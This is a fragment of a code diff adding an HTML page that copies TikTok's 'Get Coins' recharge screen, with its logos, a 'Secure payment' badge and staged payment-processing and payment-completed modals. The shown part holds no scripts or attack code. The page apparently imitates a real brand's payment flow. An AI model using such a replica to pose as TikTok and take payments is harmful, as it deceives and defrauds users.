+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .loading-spinner {
+            margin: 0 auto 30px;
+            width: 60px;
+            height: 60px;
+            position: relative;
+        }
+
+        .spinner-circle {
+            position: absolute;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .spinner-circle:first-child {
+            left: 0;
+            background: #00f2ea;
+            animation-delay: -0.32s;
+        }
+
+        .spinner-circle:last-child {
+            right: 0;
+            background: #fe2c55;
+        }
+
+        @keyframes bounce {
+            0%, 80%, 100% {
+                transform: scale(0);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .processing-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 12px;
+        }
+
+        .processing-message {
+            font-size: 16px;
+            color: #666;
+        }
+
+        @media (max-width: 640px) {
+            .payment-processing-content {
+                padding: 50px 40px;
+                margin: 0 20px;
+            }
+
+            .processing-title {
+                font-size: 20px;
+            }
+
+            .processing-message {
+                font-size: 14px;
+            }
+        }
+
+        /* 自定义充值键盘弹窗样式 */
+        .custom-keyboard-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: flex-end;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-keyboard-modal.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(100%); }
+            to { transform: translateY(0); }
+        }
+
+        .custom-keyboard-content {
+            background: white;
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            border-radius: 24px 24px 0 0;
+            padding: 0;
+            animation: slideUp 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .custom-keyboard-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            border-bottom: 1px solid #f1f1f2;
+        }
+
+        .custom-keyboard-header-left {
+            width: 32px;
+        }
+
+        .custom-keyboard-back-btn {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 24px;
+            color: #161823;
+            padding: 0;
+        }
+
+        .custom-keyboard-title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #161823;
+            flex: 1;
+            text-align: center;
+        }
+
+        .custom-keyboard-help-btn {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            cursor: pointer;
+            border-radius: 50%;
+            border: 1.5px solid #161823;
+            font-size: 18px;
+            color: #161823;
+            padding: 0;
+        }
+
+        .custom-keyboard-body {
+            padding: 20px;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .keyboard-coin-selector {
+            margin-bottom: 24px;
+        }
+
+        .keyboard-coin-label {
+            font-size: 14px;
+            color: #161823;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .keyboard-coin-input-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px;
+            background: #f8f8f8;
+            border-radius: 8px;
+            border: 2px solid #e8e8e8;
+        }
+
+        .keyboard-coin-input-wrapper.focused {
+            border-color: #fe2c55;
+            background: white;
+        }
+
+        .keyboard-coin-icon-display {
+            width: 24px;
+            height: 24px;
+        }
+
+        .keyboard-coin-input {
+            flex: 1;
+            font-size: 20px;
+            font-weight: 600;
+            color: #a0a0a0;
+            border: none;
+            background: transparent;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .keyboard-coin-input::-webkit-outer-spin-button,
+        .keyboard-coin-input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .keyboard-coin-input[type=number] {
+            -moz-appearance: textfield;
+            appearance: textfield;
+        }
+
+        .keyboard-numpad {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .keyboard-key {
+            background: #f8f8f8;
+            border: none;
+            border-radius: 12px;
+            padding: 20px;
+            font-size: 24px;
+            font-weight: 600;
+            color: #161823;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+        }
+
+        .keyboard-key:active {
+            background: #e8e8e8;
+            transform: scale(0.95);
+        }
+
+        .keyboard-key.delete-key {
+            background: #f8f8f8;
+            font-size: 20px;
+        }
+
+        .keyboard-special-offer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 0 4px;
+        }
+
+        .keyboard-special-offer-label {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .keyboard-special-offer-value {
+            font-size: 14px;
+            color: #fe2c55;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .keyboard-total {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding: 0 4px;
+        }
+
+        .keyboard-total-label {
+            font-size: 18px;
+            font-weight: 700;
+            color: #161823;
+        }
+
+        .keyboard-total-amount {
+            font-size: 24px;
+            font-weight: 700;
+            color: #161823;
+        }
+
+        .keyboard-recharge-btn {
+            width: 100%;
+            background: linear-gradient(to right, #ff6b9d, #fe2c55);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .keyboard-recharge-btn:hover:not(:disabled) {
+            opacity: 0.9;
+        }
+
+        .keyboard-recharge-btn:active:not(:disabled) {
+            opacity: 0.8;
+        }
+
+        .keyboard-recharge-btn:disabled {
+            background: #e8e8e8;
+            color: #a0a0a0;
+            cursor: not-allowed;
+            opacity: 1;
+        }
+
+        @media (max-width: 640px) {
+            .custom-keyboard-content {
+                max-height: 80vh;
+            }
+            
+            .keyboard-key {
+                padding: 16px;
+                font-size: 20px;
+            }
+        }
+
+        /* 支付完成弹窗样式 */
+        .payment-completed-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1002;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .payment-completed-modal.active {
+            display: flex;
+        }
+
+        .payment-completed-content {
+            background: white;
+            border-radius: 12px;
+            padding: 50px 80px;
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+        }
+
+        .success-icon {
+            margin: 0 auto 24px;
+            width: 80px;
+            height: 80px;
+            position: relative;
+        }
+
+        .success-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 4px solid #52c41a;
+            position: relative;
+            animation: scaleIn 0.3s ease-in-out;
+        }
+
+        .success-checkmark {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 30px;
+            height: 50px;
+            border-right: 4px solid #52c41a;
+            border-bottom: 4px solid #52c41a;
+            transform: translate(-45%, -60%) rotate(45deg);
+            animation: checkmark 0.3s 0.2s ease-in-out forwards;
+            opacity: 0;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes checkmark {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .completed-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #161823;
+            margin-bottom: 16px;
+        }
+
+        .completed-message {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .coins-info {
+            font-weight: 600;
+            color: #161823;
+        }
+
+        .go-back-btn {
+            width: 100%;
+            max-width: 300px;
+            padding: 12px 32px;
+            background: #fe2c55;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 24px;
+        }
+
+        .go-back-btn:hover {
+            background: #e02549;
+        }
+
+        .go-back-btn:active {
+            transform: scale(0.98);
+        }
+
+        @media (max-width: 640px) {
+            .payment-completed-content {
+                padding: 40px 30px;
+                margin: 0 20px;
+            }
+
+            .completed-title {
+                font-size: 20px;
+            }
+
+            .completed-message {
+                font-size: 13px;
+            }
+
+            .success-icon {
+                width: 70px;
+                height: 70px;
+            }
+
+            .success-circle {
+                width: 70px;
+                height: 70px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 移动端顶部栏 -->
+    <div class="mobile-header">
+        <h1>Get Coins</h1>
+        <div class="mobile-header-icons">
+            <svg class="mobile-header-icon" fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M17 14a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1H17ZM17 22a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1H17ZM16 31a1 1 0 0 1 1-1h8a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1h-8a1 1 0 0 1-1-1v-2Z"></path><path d="M6 10a7 7 0 0 1 7-7h22a7 7 0 0 1 7 7v28a7 7 0 0 1-7 7H13a7 7 0 0 1-7-7V10Zm7-3a3 3 0 0 0-3 3v28a3 3 0 0 0 3 3h22a3 3 0 0 0 3-3V10a3 3 0 0 0-3-3H13Z"></path></svg>
+            <svg class="mobile-header-icon" fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M21.36 28.05V22.8l1.79-.1c2.33-.1 3.87-1.36 3.87-3.31s-1.31-3-3.33-3c-1.95 0-3.53.95-3.88 3.1l-4.31-.7c.54-3.98 3.78-6.28 8.54-6.28 4.5 0 7.66 2.66 7.66 6.75 0 3.3-2.18 5.66-5.58 6.3v2.5h-4.76ZM20.62 32.72a2.99 2.99 0 0 1 3.07-3.04 2.96 2.96 0 0 1 3.04 3.04c0 1.7-1.28 3.01-3.04 3.01a2.98 2.98 0 0 1-3.07-3Z"></path><path d="M2 24a22 22 0 1 1 44 0 22 22 0 0 1-44 0Zm22 18a18 18 0 1 0 0-36 18 18 0 0 0 0 36Z"></path></svg>
+        </div>
+    </div>
+
+    <!-- 顶部导航栏 -->
+    <nav class="navbar">
+        <div class="navbar-inner">
+            <a href="#" class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42" alt="TikTok"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
+            </a>
+            <div class="search-container">
+                <input type="text" class="search-input" placeholder="Search">
+                <span class="search-icon">
+                    <svg width="24" data-e2e="" height="24" viewBox="0 0 48 48" fill="rgba(22, 24, 35, .34)" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22 10C15.3726 10 10 15.3726 10 22C10 28.6274 15.3726 34 22 34C28.6274 34 34 28.6274 34 22C34 15.3726 28.6274 10 22 10ZM6 22C6 13.1634 13.1634 6 22 6C30.8366 6 38 13.1634 38 22C38 25.6974 36.7458 29.1019 34.6397 31.8113L43.3809 40.5565C43.7712 40.947 43.7712 41.5801 43.3807 41.9705L41.9665 43.3847C41.5759 43.7753 40.9426 43.7752 40.5521 43.3846L31.8113 34.6397C29.1019 36.7458 25.6974 38 22 38C13.1634 38 6 30.8366 6 22Z"></path></svg>
+                </span>
+            </div>
+            <div class="nav-actions">
+                <button class="upload-btn">
+                    <svg class="css-qeydvm-StyledPlusIcon eqzodb05" width="1em" data-e2e="" height="1em" viewBox="2 2 12 12" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8 2.5C7.58579 2.5 7.25 2.83579 7.25 3.25V7.25H3.25C2.83579 7.25 2.5 7.58579 2.5 8C2.5 8.41421 2.83579 8.75 3.25 8.75H7.25V12.75C7.25 13.1642 7.58579 13.5 8 13.5C8.41421 13.5 8.75 13.1642 8.75 12.75V8.75H12.75C13.1642 8.75 13.5 8.41421 13.5 8C13.5 7.58579 13.1642 7.25 12.75 7.25H8.75V3.25C8.75 2.83579 8.41421 2.5 8 2.5Z"></path></svg>
+                    <span>Upload</span>
+                </button>
+                <svg class="css-y48l9g-StyledIcon e1nx07zo1" width="24" data-e2e="" height="24" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.17877 7.17357C2.50304 6.45894 3.21528 6 4.00003 6H44C44.713 6 45.372 6.37952 45.7299 6.99615C46.0877 7.61278 46.0902 8.37327 45.7365 8.99228L25.7365 43.9923C25.3423 44.6821 24.5772 45.0732 23.7872 44.9886C22.9972 44.9041 22.3321 44.3599 22.0929 43.6023L16.219 25.0017L2.49488 9.31701C1.97811 8.72642 1.85449 7.88819 2.17877 7.17357ZM20.377 24.8856L24.531 38.0397L40.5537 10H8.40757L18.3918 21.4106L30.1002 14.2054C30.5705 13.9159 31.1865 14.0626 31.4759 14.533L32.5241 16.2363C32.8136 16.7066 32.6669 17.3226 32.1966 17.612L20.377 24.8856Z"></path></svg>
+                <svg class="css-1g0p6jv-StyledInboxIcon e1udzu101" width="32" data-e2e="" height="32" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z"></path></svg>
+                <div class="user-avatar"><img src="./img/tiktok.png" alt="User Avatar" style="width: 100%; height: 100%; border-radius: 50%;"></div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- 主内容区域 -->
+    <div class="main-container">
+        <div class="content-wrapper">
+            <!-- 标题 -->
+            <div class="header-section">
+                <h1 class="page-title">Get Coins</h1>
+                <a href="#" class="transaction-link">View transaction history</a>
+            </div>
+
+            <!-- 用户信息卡片 -->
+            <div class="user-card">
+                <div class="secure-payment-badge">
+                    <div class="secure-payment-content">
+                        <svg fill="currentColor" color="inherit" font-size="9.58px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M22.6 1.24c-6.47 5.47-12.29 6.74-15.34 7C6.06 8.34 5 9.32 5 10.53V23.2c0 14.16 14.76 21.85 18.26 23.47.47.22 1 .22 1.47 0C28.23 45.05 43 37.37 43 23.2V10.52c0-1.2-1.06-2.18-2.26-2.28-3.06-.26-8.88-1.53-15.35-7a2.17 2.17 0 0 0-2.79 0Zm5.62 12.46a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.93 2.93 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path></svg>
+                        <strong>Secure payment</strong>
+                        <svg fill="currentColor" class="flip-rtl" color="inherit" font-size="9.58px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M27.76 24 14.59 10.83a1 1 0 0 1 0-1.42L17.4 6.6a1 1 0 0 1 1.42 0l16.35 16.35a1.5 1.5 0 0 1 0 2.12L18.83 41.41a1 1 0 0 1-1.42 0L14.6 38.6a1 1 0 0 1 0-1.42L27.76 24Z"></path></svg>
+                    </div>
+                </div>
+                <div class="user-info">
+                    <div class="user-card-avatar"><img src="./img/tiktok.png" alt="User Avatar" style="width: 100%; height: 100%; border-radius: 50%;"></div>
+                    <svg class="tiktok-logo" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42" alt="TikTok"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
+                    <div class="user-details">
+                        <h3>admin</h3>
+                        <div class="coin-balance">
+                            <svg class="block" color="inherit" font-size="16px" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__a)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__a"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                            <span>0</span>
+                            <span class="divider">|</span>
+                            <span>9L18H3P8 <svg fill="currentColor" font-size="14px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path fill-rule="evenodd" clip-rule="evenodd" d="M32 32h2.4c3.36 0 5.04 0 6.32-.66a6 6 0 0 0 2.63-2.62c.65-1.28.65-2.96.65-6.32v-8.8c0-3.36 0-5.04-.65-6.33a6 6 0 0 0-2.63-2.62C39.44 4 37.76 4 34.4 4h-8.8c-3.36 0-5.04 0-6.32.65a6 6 0 0 0-2.63 2.62C16 8.56 16 10.24 16 13.6V16h-2.4c-3.36 0-5.04 0-6.32.65a6 6 0 0 0-2.63 2.62C4 20.56 4 22.24 4 25.6v8.8c0 3.36 0 5.04.65 6.32a6 6 0 0 0 2.63 2.62c1.28.66 2.96.66 6.32.66h8.8c3.36 0 5.04 0 6.32-.66a6 6 0 0 0 2.63-2.62c.65-1.28.65-2.96.65-6.32V32Zm2.4-24h-8.8c-1.75 0-2.82 0-3.62.07a5.12 5.12 0 0 0-.86.13l-.03.02a2 2 0 0 0-.87.87l-.01.03a5.11 5.11 0 0 0-.14.86c-.07.8-.07 1.87-.07 3.62V16h2.4c3.36 0 5.04 0 6.32.65a6 6 0 0 1 2.63 2.62c.65 1.29.65 2.97.65 6.33V28h2.4c1.75 0 2.82 0 3.62-.07a5.14 5.14 0 0 0 .86-.14h.02v-.01a2 2 0 0 0 .88-.87l.01-.02v-.02l.04-.12c.03-.14.07-.36.1-.74.07-.8.07-1.87.07-3.61v-8.8c0-1.75 0-2.82-.07-3.62a5.11 5.11 0 0 0-.15-.89 2 2 0 0 0-.87-.87l-.03-.02a5.12 5.12 0 0 0-.86-.14C37.22 8 36.15 8 34.4 8ZM13.6 20h8.8c1.75 0 2.82 0 3.62.07a5.14 5.14 0 0 1 .86.13l.03.02a2 2 0 0 1 .88.9 5.11 5.11 0 0 1 .14.86c.07.8.07 1.87.07 3.62v8.8c0 1.74 0 2.81-.07 3.61a5.11 5.11 0 0 1-.14.86v.04a2 2 0 0 1-.88.87.24.24 0 0 1-.03.01l-.13.04c-.14.03-.36.07-.73.1-.8.06-1.87.07-3.62.07h-8.8c-1.75 0-2.82 0-3.62-.07a5.14 5.14 0 0 1-.86-.14l-.03-.01a2 2 0 0 1-.87-.87l-.01-.04-.04-.12a5.12 5.12 0 0 1-.1-.74C8 37.21 8 36.14 8 34.4v-8.8c0-1.75 0-2.82.07-3.62a5.13 5.13 0 0 1 .15-.89 2 2 0 0 1 .87-.87l.03-.02.13-.03c.14-.03.36-.07.73-.1.8-.07 1.87-.07 3.62-.07Z"></path></svg></span>
+                    </div>
+                    </div>
+                    <svg class="user-info-arrow" fill="currentColor" font-size="18px" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M34.7 20.7a1 1 0 0 1 0 1.42l-9.29 9.3a2 2 0 0 1-2.82 0l-9.3-9.3a1 1 0 0 1 0-1.41l1.42-1.42a1 1 0 0 1 1.41 0L24 27.17l7.88-7.88a1 1 0 0 1 1.41 0l1.42 1.42Z"></path></svg>
+                </div>
+            </div>
+
+            <!-- 充值提示 -->
+            <div class="recharge-notice">
+                <span class="label">Recharge:</span>
+                <span class="highlight">Save around 25% with a lower third-party service fee.</span>
+                <svg class="info-icon" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-width="1.5" fill="none"/>
+                    <path d="M8 7V11M8 5V5.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <!-- 用户名输入框 -->
